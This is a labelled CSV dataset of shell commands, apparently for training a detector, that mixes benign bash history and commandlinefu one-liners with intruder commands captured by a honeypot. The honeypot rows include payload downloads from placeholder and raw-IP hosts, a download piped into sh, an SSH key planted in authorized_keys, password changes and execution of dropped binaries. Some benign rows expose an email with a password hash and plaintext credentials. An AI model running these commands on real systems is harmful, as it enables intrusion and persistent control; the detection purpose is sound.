id,command,label,source,split
d2_000408,ls /opt/metasploit/apps/pro/ui/config/,0,bash_history,train
d2_000410,>/var/tmp/.file,1,honeypot,train
d2_000412,mdk s service rm %%_metricbeat,0,bash_history,train
d2_000413,sudo vim rt_tables,0,bash_history,train
d2_000414,history |grep FastQC,0,bash_history,train
d2_000415,source /etc/profile,0,bash_history,train
d2_000416,yaourt bitstream,0,bash_history,train
d2_000417,mv info moreinfo,0,bash_history,train
d2_000419,gs -sDEVICE=pswrite -sOutputFile=- -q -dNOPAUSE With-Fonts.pdf -c quit | ps2pdf - > No-Fonts.pdf,0,commandlinefu,train
d2_000420,> > [goalador@gatanda corpwebsite-starterkit]$ [goalador@gatanda corpwebsite-starterkit]$ [goalador@gatanda corpwebsite-starterkit]$ Password for s@albrechthain.git.beanstalkapp.co[goalador@gatanda corpwebsite-starterkit]$ [goalador@gatanda corpwebsite-starterkit]$ bash: Password: command not found,0,bash_history,train
d2_000421,chmod +x njs.sh,1,honeypot,train
d2_000422,yay -Ss qtwebkit,0,bash_history,train
d2_000423,"PERMA () { echo ""$@"" >> ~/.bashrc; }",0,commandlinefu,train
d2_000424,"rpm -qa --qf ""%-10{SIZE} %-30{NAME}\n"" | sort -nr | less",0,commandlinefu,train
d2_000425,wget https://hcbde1f0b.example.net/Hvtxv/config.json,1,honeypot,train
d2_000427,tftpd,0,bash_history,train
d2_000429,./YeOrypl3,1,honeypot,train
d2_000430,curl -O http://h5b59e41c.example.net/ys53a,1,honeypot,train
d2_000431,sudo apt-get install python-scipy,0,bash_history,train
d2_000433,"ls -d1 $PWD/{.*,*}",0,commandlinefu,train
d2_000434,wgetsercontent.com/StevenBlack/hosts/master/hosts,0,bash_history,train
d2_000435,exit() exit(),0,bash_history,train
d2_000436,"sed -r ""s/(\x1B|\033)(\(B|\[([0-9]{1,2}(;[0-9]{1,2})?)?[A-Z])//Ig""",0,commandlinefu,train
d2_000438,flac --best *.wav,0,commandlinefu,train
d2_000439,"mplayer -fs -vf screenshot,mirror tv://",0,commandlinefu,train
d2_000440,scp -t /dev/shm/a2t5h3tau93ic4l22o2ae7m2qw,1,honeypot,train
d2_000441,grep -C 4 \#ENCRYPT_METHOD etc/login.defs,0,bash_history,train
d2_000442,"step1() { k1=""Consumer key"" ; k2=""Consumer secret"" ; k3=""Access token"" ; k4=""Access token secret"" ; once=$RANDOM ; ts=$(date +%s) ; hmac=""$k2&$k4"" ; id=""19258798"" ; }",0,commandlinefu,train
d2_000443,wget http://h7d766682.example.net/exploit.jpg,1,honeypot,train
d2_000445,fail2ban-client staus,0,bash_history,train
d2_000447,dmesg -wx,0,commandlinefu,train
d2_000448,pthread,0,bash_history,train
d2_000449,lsof +p xxxx,0,commandlinefu,train
d2_000452,"for file in *.png; do convert ""$file"" ""$(basename $file .png).gif""; done",0,commandlinefu,train
d2_000453,echo start > battery.txt; watch -n 60 'date >> battery.txt ; acpi -b >> battery.txt',0,commandlinefu,train
d2_000454,halt 0,0,bash_history,train
d2_000455,/bin/busybox rm -f /proc/sched_debug/.nippon,1,honeypot,train
d2_000456,rsync --daemon --port 1234 --no-detach -v --config rsyncd.conf,0,commandlinefu,train
d2_000458,7z a -mx=9 -ms=on archive.7z files_for_archiving/,0,commandlinefu,train
d2_000459,"python -ic ""from __future__ import division; from math import *; from random import *""",0,commandlinefu,train
d2_000460,less /etc/apt/apt.conf.d/01autoremove-kernels,0,bash_history,train
d2_000461,nano palind.rb,0,bash_history,train
d2_000462,(sp-sc sop://broker.sopcast.com:3912/6002 3900 8900 &>/dev/null &); sleep 10; mplayer http://h5ed84001.example.net/tv.asf,0,commandlinefu,train
d2_000463,091113_Axo2PE_Eva/s_2_2/s_2_2.fq.gz AxoMikeTest/091113_Axo2PE_Eva/s_2_2/s_2_2.fq.gz &,0,bash_history,train
d2_000464,vi 1,0,bash_history,train
d2_000465,[goalador@gatanda hhneuauf.de]$ [goalador@gatanda hhneuauf.de]$ [goalador@gatanda hhneuauf.de]$ [goalador@gatanda hhneuauf.de]$ [goalador@gatanda hhneuauf.de]$ da hhneuauf.de]$ [goalador@gatanda hhneuauf.de]$ [CHG] Controller C8:F7:33:33:E2:F7 UUIDs: 0000110b-0000-1000-8000-00805f9b34fb,0,bash_history,train
d2_000466,groups air,0,bash_history,train
d2_000467,mkdir partie2,0,bash_history,train
d2_000468,chmod -R 777 databases/,0,bash_history,train
d2_000469,for f in *;do flac -cd $f |lame -b 192 - $f.mp3;done,0,commandlinefu,train
d2_000471,LC_ALL=C echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDTiGm9b44ZjkQoMkcGuVsC8SGW7a9aFODS6nb64WnMwBwKPja7k56LyBBdVRm+MeKecx6Q/qLn5J+ggJ6um/LoCjKJLrX2dFOjGdyR4ZjnVBwibgr8PLrPoo7bUkaR3DMjfhcmoRlFrj51aN6g0TYHejCmug3TRpg37djYKqJ539iGNcmj021ZlzDBrjfIxUY849O72GsMuytk8n3K6XFxHj8gHyOsB7NgyvE39x9/SoGq2gkQS6TFun6dhmsr+ORokfS2265RwbdEOfnwL2LnQNuhiePlOUHRqzpc0K2pu9TGo1vNRIGSymCatMUNgnNX3tfcuMP5e8f1xDVh7fx3 >>~/.ssh/authorized_keys,1,honeypot,train
d2_000473,rm -rf .profile .bashrc .bash_logout,1,honeypot,train
d2_000474,/bin/busybox cp,1,honeypot,train
d2_000475,rm -i ~/.bashrc ~/.functions ~/.aliases ~/.profile ~/.bash_logout,0,bash_history,train
d2_000476,wget http://h2c7b3241.example.net/swrgiuhguhwrguiwetu/x86,1,honeypot,train
d2_000478,sudo apt autoremove --purge,0,bash_history,train
d2_000480,pdftk A=odd.pdf B=even.pdf shuffle A1-end Bend-1S output duplex.pdf,0,commandlinefu,train
d2_000482,sudo git commit -a #cambios en caliente,0,bash_history,train
d2_000485,/bin/busybox cat /sys/fs/cgroup/hugetlb/.nippon,1,honeypot,train
d2_000486,find . -name .local -prune -o -print /-print,0,bash_history,train
d2_000487,CPUS=$(grep -c ^processor /proc/cpuinfo),1,honeypot,train
d2_000488,wget -r -A .pdf -l 5 -nH --no-parent http://h0caaf24a.example.net,0,commandlinefu,train
d2_000489,dnstop -l 3 enp1s0f0,0,commandlinefu,train
d2_000491,cd /tmp/,1,honeypot,train
d2_000492,perl p79.118.199.21p,1,honeypot,train
d2_000493,"find ../endothelial_hq -name ""*.fa"" |du -sck",0,bash_history,train
d2_000494,vim gtk3-nocsd,0,bash_history,train
d2_000495,echo c6bnrTNheEod) | passwd,1,honeypot,train
d2_000496,less Downloads/wrtbwmon.sh,0,bash_history,train
d2_000497,ls -altr,0,bash_history,train
d2_000498,audio-convert <dir>/*,0,commandlinefu,train
d2_000499,ls -la /home | gzip | base64,1,honeypot,train
d2_000500,unminimie,1,honeypot,train
d2_000501,apt-cache search dhcp,0,bash_history,train
d2_000502,mkdir -p ~/.config/awesome/,0,bash_history,train
d2_000503,alias differ='sdiff --suppress-common-lines',0,commandlinefu,train
d2_000505,python run_stopwatch.py,0,bash_history,train
d2_000506,mv editUserController.php editusercontroller.php,0,bash_history,train
d2_000507,bash -c ./iqGTOpog,1,honeypot,train
d2_000509,sudo chmod 777 /usr/bin/gdb,0,bash_history,train
d2_000510,apt-get install minicom,0,bash_history,train
d2_000511,vimdiff scp://root@server-foo.com//etc/snmp/snmpd.conf scp://root@server-bar.com//etc/snmp/snmpd.conf,0,commandlinefu,train
d2_000512,pdftk $* cat output $merged.pdf,0,commandlinefu,train
d2_000513,sudo pip install -r requirements.txt,0,bash_history,train
d2_000514,"sudo -S <<< ""123qweASD"" /dev/shm/.satan",1,honeypot,train
d2_000515,ls ~/webentwicklung/GitHub/,0,bash_history,train
d2_000516,rout,0,bash_history,train
d2_000517,cut -d\ -f 1 ~/.bash_history | sort | uniq -c | sort -rn | head -n 10 | sed 's/.*/ &/g',0,commandlinefu,train
d2_000518,"mysms='xxx0001234@messaging.sprintpcs.com' ; expect -c ""log_user 0 ; set timeout -1 ; spawn usbmon -i usb0 ; expect -re \""C.*Ii.*-2:128\"" { spawn sendmail $mysms ; send \""Smart Home Sensor Triggered\n.\n\"" ; expect }""",0,commandlinefu,train
d2_000520,mv .wallpaper Picture/,0,bash_history,train
d2_000521,"netstat -tn | awk '($4 ~ /:22\s*/) && ($6 ~ /^EST/) {print substr($5, 0, index($5,"":""))}'",0,commandlinefu,train
d2_000523,"vzlist -a -H -o hostname,diskspace,diskspace.s,veid | awk '{ printf( ""%2.f%\t%s\t%s\n""), $2*100/$3, $4, $1}' | sort -r",0,commandlinefu,train
d2_000525,vim vig,0,bash_history,train
d2_000527,rm hac.sh,1,honeypot,train
d2_000528,alias cr='find . 2>/dev/null -regex '\''.*\.\(c\|cpp\|pc\|h\|hpp\|cc\)$'\'' | xargs grep --color=always -ni -C2',0,commandlinefu,train
d2_000529,rmdir,0,bash_history,train
d2_000530,tftp -r sensi2.sh -g 114.27.45.215,1,honeypot,train
d2_000531,git diff source/CMAgentSsp/ssp_action.c,0,bash_history,train
d2_000532,git clonestoread/muzei.git,0,bash_history,train
d2_000533,cpuinfo,1,honeypot,train
d2_000534,tar zxf virtualenv-1.9.1.tar.gz,0,bash_history,train
d2_000536,apt-cache search | grep PIL,0,bash_history,train
d2_000537,vi /w4home/mikec/.bash_profile_O,0,bash_history,train
d2_000538,rename 's/^hospital\.php\?loc=(\d{4})$/hospital_$1/' hospital.php*,0,commandlinefu,train
d2_000540,rm file{1..10},0,commandlinefu,train
d2_000544,./m5rHLW5v,1,honeypot,train
d2_000545,sudo apt install i3,0,bash_history,train
d2_000546,/bin/busybox wget http://hecb9178b.example.net/fbot.x86_64 -O-> f,1,honeypot,train
d2_000547,/ip cloud print,1,honeypot,train
d2_000548,git push git ini,0,bash_history,train
d2_000549,cat tmp.markdown,0,bash_history,train
d2_000550,git remote add origin glafkv@delmar.umsl.edu:project.git,0,bash_history,train
d2_000553,"curl -s http://h0caaf24a.example.net | grep -o -P ""<a.*href.*>"" | grep -o ""http.*.pdf"" | xargs -d""\n"" -n1 wget -c",0,commandlinefu,train
d2_000554,youtube-dls,0,bash_history,train
d2_000555,"echo ""text"" | hd",0,commandlinefu,train
d2_000556,sudo nano TempHum.py,0,bash_history,train
d2_000557,GET checkip.dyndns.org,0,commandlinefu,train
d2_000558,sys password VivBPucWpUL,1,honeypot,train
d2_000559,>/tmp/.hbot,1,honeypot,train
d2_000560,wgets.home.ro/udp.pl,0,bash_history,train
d2_000561,"history | perl -F""\||<\(|;|\`|\\$\("" -alne 'foreach (@F) { print $1 if /\b((?!do)[a-z]+)\b/i }' | sort | uniq -c | sort -nr | head",0,commandlinefu,train
d2_000562,wget http://h095a0dc7.example.net/1/ug.txt,1,honeypot,train
d2_000564,script -f /tmp/foo; tail -f /tmp/foo,0,commandlinefu,train
d2_000566,git config --global user.email,0,bash_history,train
d2_000567,open app-ios/LocalizedStringKit/vi.lproj/LocalizedStringKit.strings,0,bash_history,train
d2_000568,sudo nano /edx/app/edxapp/edx-platform/lms/urls.py,0,bash_history,train
d2_000569,"watch -n 1 -d ""finger""",0,commandlinefu,train
d2_000570,cmake -D CMAKE_BUILD_TYPE=RELEASE -D CMAKE_INSTALL_PREFIX=/usr/local,0,bash_history,train
d2_000571,sudo systemctl start lora-app-server,0,bash_history,train
d2_000572,sleep 5h && rhythmbox path/to/song,0,commandlinefu,train
d2_000573,chmod +x zPqpZciO,1,honeypot,train
d2_000579,cd test,1,honeypot,train
d2_000580,sudo docker rm $(docker ps -a -q); sudo docker rmi $(docker images -q),0,commandlinefu,train
d2_000581,git log -p -z | perl -ln0e 'print if /[+-].*searchedstring/',0,commandlinefu,train
d2_000583,/bin/busybox rm -f /sys/fs/cgroup/memory/.nippon,1,honeypot,train
d2_000584,vim volume_control.py,0,bash_history,train
d2_000585,wgetsmirror.com/files/spigot/spigot-latest.jar,0,bash_history,train
d2_000586,echo [id:$(id -g 2>/dev/null,1,honeypot,train
d2_000587,"ls -l |grep ""Jan""",0,bash_history,train
d2_000588,lsof -i:6379 |awk '{print $2}' | tail -n 1,0,bash_history,train
d2_000589,git clone git://projects.archlinux.org/archiso.git && cd archiso,0,bash_history,train
d2_000590,chmod 777 t8UsA.sh,1,honeypot,train
d2_000591,be rails g scaffold building_type name:string,0,bash_history,train
d2_000592,while [ -d /proc/$PPID ],1,honeypot,train
d2_000593,mv * he3/,0,bash_history,train
d2_000594,sudo apt-get source ffmpeg-dmo,0,bash_history,train
d2_000595,novo,0,bash_history,train
d2_000597,git push -,0,bash_history,train
d2_000598,chown toeknee:toeknee /home/toeknee,0,bash_history,train
d2_000600,script /dev/null | tee /dev/pts/3,0,commandlinefu,train
d2_000601,LC_ALL=C top -bn1,1,honeypot,train
d2_000603,ssh -o UserKnownHostsFile=/dev/null root@145.170.68.118,0,commandlinefu,train
d2_000605,sed -i '19375 s/^/#/' file,0,commandlinefu,train
d2_000606,wget http://hdf44a9f6.example.net/8UsA.sh,1,honeypot,train
d2_000609,rosmsg list,0,bash_history,train
d2_000610,"(1, 'Jake', 'jacobgreene1991@gmail.com', '$2y$10$PGRNesCZ4Gdug5.jjRSEGebjHO56QsWIXJckfDM/N8qoJLrAO5EiC', 'CtpLWnLpS91CzlGNH8hcERYLVYiJwOBOrl4Cz5wGOuVlTsBbz0dbDF4dkw0X', '2017-06-29 02:10:58', '2017-06-29 02:10:58', 1),",0,bash_history,train
d2_000612,lsof -iTCP -sTCP:ESTABLISHED | awk '{print $1}' | sort -u,0,commandlinefu,train
d2_000613,"echo ""($(date +%s)-$(date +%s -d ""march 1""))/86400""|bc",0,commandlinefu,train
d2_000614,"ogr2ogr -f MySQL MySQL:thackbarth,host=localhost,user=thackbarth,password=og1cee1E Shape -nln MilitaryBase -update -overwrite -lco engine=MYISAMta",0,bash_history,train
d2_000615,bash -c ./TXA9qpXP,1,honeypot,train
d2_000616,mkdir .tmux,0,bash_history,train
d2_000617,"cuebreakpoints ""$2"" | shnsplit -o flac ""$1""",0,commandlinefu,train
d2_000618,minicom,0,bash_history,train
d2_000619,sudo apt-get install python-dev,0,bash_history,train
d2_000620,sh bin4.sh,1,honeypot,train
d2_000621,vim demo.html,0,bash_history,train
d2_000623,"echo ""Uname: ""`uname -a`",1,honeypot,train
d2_000624,"ps -e -o pcpu,cpu,nice,state,cputime,args --sort pcpu | sed ""/^ 0.0 /d""",0,commandlinefu,train
d2_000625,"zgrep -h """" `ls -tr access.log*`",0,commandlinefu,train
d2_000626,while :;do killall -USR1 dd;sleep 1;done,0,commandlinefu,train
d2_000627,wget http://h58814ca8.example.net/DoS/udp.pl,1,honeypot,train
d2_000629,./Xmf8nTwT,1,honeypot,train
d2_000630,( shopt -s extglob; rm !(<PATTERN>) ),0,commandlinefu,train
d2_000631,pip install --upgrade PyMySQL,0,bash_history,train
d2_000632,./dmcli eRT addtables Device.WiFi,0,bash_history,train
d2_000633,ls SilenceExport/,0,bash_history,train
d2_000634,./tgoM7S1r,1,honeypot,train
d2_000636,unrar p -inul *.rar|mplayer -cache 100000 -,0,commandlinefu,train
d2_000637,mkdir .m,0,bash_history,train
d2_000638,sudo dpkg -P bcloud,0,bash_history,train
d2_000639,"find . -name ""*.php"" -exec php -l {} \; | sed -e ""/^No syntax/d""",0,commandlinefu,train
d2_000640,sudo ls /root,0,bash_history,train
d2_000642,ssh data001.ref01.conso.qualif.gen01.ke.p.fti.net,0,bash_history,train
d2_000643,wgets.com/cocosel_01/psybnc-emech-eggdrop/psyBNC2.3.tar,0,bash_history,train
d2_000644,/bin/busybox chmod +x hbot,1,honeypot,train
d2_000645,"rsync -aHAXxv --numeric-ids --delete --progress -e ""ssh -T -c arcfour -o Compression=no -x"" user@<source>:<source_dir> <dest_dir>",0,commandlinefu,train
d2_000646,git config --global user.email dave.wong@utah.edu,0,bash_history,train
d2_000647,cleaer,0,bash_history,train
d2_000648,rm /home/geek/serverprod.crt,0,bash_history,train
d2_000651,curl -O http://h08a1945d.example.net/Corona.sh,1,honeypot,train
d2_000652,syscoind -datadir=2 getinfo,0,bash_history,train
d2_000653,sudo apt-get install python-setuptools,0,bash_history,train
d2_000654,sed '/INSERT INTO `unwanted_table`/d' mydb.sql > reduced.sql,0,commandlinefu,train
d2_000656,vi post-update,0,bash_history,train
d2_000657,./BU0AMNQz,1,honeypot,train
d2_000658,cp 05-mypublickey1.txt ~/os162/week00/mypublickey1.txt,0,bash_history,train
d2_000659,chown 777 123,0,bash_history,train
d2_000660,chmod 777 bins.sh,1,honeypot,train
d2_000661,./bin/bash > test.out,0,bash_history,train
d2_000662,ls Si-ta,0,bash_history,train
d2_000663,wget dl.tuddo.me/speedtest.py,1,honeypot,train
d2_000664,./ps2,1,honeypot,train
d2_000666,touch /var/log/maillog,1,honeypot,train
d2_000670,rm err,0,bash_history,train
d2_000671,find ~/.mozilla/firefox/*/Cache -exec file {} \; | awk -F ': ' 'tolower($2)~/mpeg/{print $1}',0,commandlinefu,train
d2_000672,ls /isitools/CentOS-5/,0,bash_history,train
d2_000673,as,1,honeypot,train
d2_000674,rm build_package.log,0,bash_history,train
d2_000675,LC_ALL=C chattr +a /etc/shadow,1,honeypot,train
d2_000676,startxfce4 -- :2,0,bash_history,train
d2_000677,git stash 7e8fa27acaad6d51b76d72c86b5184f7f348f1c3,0,bash_history,train
d2_000678,rm -r aliases/ blocks/ certificates/ chainstate/ *.log,0,bash_history,train
d2_000679,g status,0,bash_history,train
d2_000680,sudo ifconfig en1 ether 00:e2:e3:e4:e5:e6,0,commandlinefu,train
d2_000681,mv psybnc awk,0,bash_history,train
d2_000683,rm -rf App.js,0,bash_history,train
d2_000684,./arm self.download,1,honeypot,train
d2_000685,git checkout -b briq-about,0,bash_history,train
d2_000687,yum install Fonts,0,bash_history,train
d2_000688,"echo ""zeroshell"" | sudo -S mount -o remount,rw '/'",1,honeypot,train
d2_000689,tftp 148.62.30.58 -c get Senpai2.sh,1,honeypot,train
d2_000691,rm -fr new-code-certificates/,0,bash_history,train
d2_000692,chmod +x intel.sh,0,bash_history,train
d2_000693,chmod +x zerador.sh,0,bash_history,train
d2_000694,oc project abi-jenkins,0,bash_history,train
d2_000695,"python -c'for i in range(1,101):print""FizzBuzz""[i*i%3*4:8--i**4%5]or i'",0,commandlinefu,train
d2_000696,vi conf/searchguard/sg_roles_mapping.yml,0,bash_history,train
d2_000697,kill -9 kworker/0:1,0,bash_history,train
d2_000698,pip --proxy http://h51a737c8.example.net install Jinja2==2.9.6,0,commandlinefu,train
d2_000699,vim .dockerfunc,0,bash_history,train
d2_000700,"cp httpd.conf{,.bk}",0,commandlinefu,train
d2_000701,iw dev wlo1,0,bash_history,train
d2_000702,sudo cp ~/Downloads/Oferta\ angajare_BCR.pdf .,0,bash_history,train
d2_000703,find . -type d -name .svn -delete,0,commandlinefu,train
d2_000704,df -hs,0,bash_history,train
d2_000705,nano bootlogd,0,bash_history,train
d2_000706,chef exec rspec spec/unit/recipes/service.rb,0,bash_history,train
d2_000707,git checkout mynewbranch,0,bash_history,train
d2_000708,cmd=$(uname -a),1,honeypot,train
d2_000709,pacman -C,0,bash_history,train
d2_000710,git add app/modular/pages/briq-calendar.html,0,bash_history,train
d2_000712,./bybys swalllav failas 6468,0,bash_history,train
d2_000714,mv yii-test.conf yii-test.conf.bak,0,bash_history,train
d2_000715,nbgrader fetch --course data301 day01,0,bash_history,train
d2_000717,apt-get install zmap,1,honeypot,train
d2_000718,diff babymarvel whoami,0,bash_history,train
d2_000721,tidy -i -xml <inputfile>,0,commandlinefu,train
d2_000722,find . -name *.sh|xargs grep -i wifiext,0,bash_history,train
d2_000723,"ffmpeg -f alsa -r 16000 -i hw:2,0 -f video4linux2 -s 800x600 -i /dev/video0 -r 30 -f avi -vcodec mpeg4 -vtag xvid -sameq -acodec libmp3lame -ab 96k output.avi",0,commandlinefu,train
d2_000724,./C5e4O5Pq,1,honeypot,train
d2_000726,wget -q -O- http://hfd868320.example.net/i.sh | sh,1,honeypot,train
d2_000728,sh backuper.sh,1,honeypot,train
d2_000729,tr '\000' '\377' < /dev/zero | dd of=allones bs=1024 count=2k,0,commandlinefu,train
d2_000730,"echo ""test"" | lp -d $PRINTER",0,commandlinefu,train
d2_000732,cd /var/,1,honeypot,train
d2_000734,sudo nano /edx/app/edxapp/edx-platform/lms/djangoapps/ls,0,bash_history,train
d2_000736,cd vmlinuz,1,honeypot,train
d2_000737,rm -f /tmp/.nippon,1,honeypot,train
d2_000739,"step4() { oauth_header=""Authorization: OAuth oauth_consumer_key=\""$k1\"", oauth_nonce=\""$once\"", oauth_signature=\""$signature\"", oauth_signature_method=\""HMAC-SHA1\"", oauth_timestamp=\""$ts\"", oauth_token=\""$k3\"", oauth_version=\""1.0\"""" ; }",0,commandlinefu,train
d2_000740,openssl base64 -d < file.txt > out,0,commandlinefu,train
d2_000741,rm -rf .mr,1,honeypot,train
d2_000742,"curl -ik -u pdashboard_infra:p_dashboardinfra -X POST --header ""Content-Type:application/json"" -d@reglab.jsonsqainfra-mesos02.sqaextranet.akamai.com:8443/v2/apps",0,bash_history,train
d2_000743,nano error.log,0,bash_history,train
d2_000744,git clone sumitkumari/git/test1,0,bash_history,train
d2_000745,find . -type f | xargs grep <keyword>,0,commandlinefu,train
d2_000746,log2() { local n=0; for ((i=$1-1; i>0; i>>=1)); do ((n+=1)); done; echo $n; },0,commandlinefu,train
d2_000747,sudo apt-get install arduino,0,bash_history,train
d2_000748,rm -rf zyk .a,1,honeypot,train
d2_000749,tftp 1.139.159.21 -c get awoo.sh,1,honeypot,train
d2_000751,/bin/busybox echo -e '\x50\x6f\x72\x74/dev' > /dev/.none,1,honeypot,train
d2_000752,./admin,1,honeypot,train
d2_000753,wget http://hb70cd2c1.example.net/it.sh,1,honeypot,train
d2_000754,stat archNotes.self | tail -1,0,bash_history,train
d2_000755,cat /proc/cpuinfo | grep model | wc -l,1,honeypot,train
d2_000756,./e,1,honeypot,train
d2_000758,"Diff files over SSH: ssh [login]@[host] ""cat [remote file]"" | diff - ""[local file]""",0,commandlinefu,train
